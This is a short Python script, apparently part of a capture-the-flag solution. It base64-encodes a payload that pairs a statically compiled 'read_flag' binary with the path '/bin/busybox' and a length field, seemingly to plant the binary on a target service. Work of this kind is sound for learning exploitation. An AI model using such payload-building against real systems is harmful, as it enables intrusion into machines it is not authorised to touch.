import base64

# docker run -v "$PWD:$PWD" -w "$PWD" musl-gcc gcc read_flag.c --static -g -Os -s -o read_flag
with open('read_flag', 'rb') as f:
    data = f.read()

buf = b'd\x00'
buf += b'/bin/busybox\x00'
buf += str(len(data)).encode('utf-8') + b'\x00'
buf += data

print(base64.b64encode(buf).decode('utf-8'))
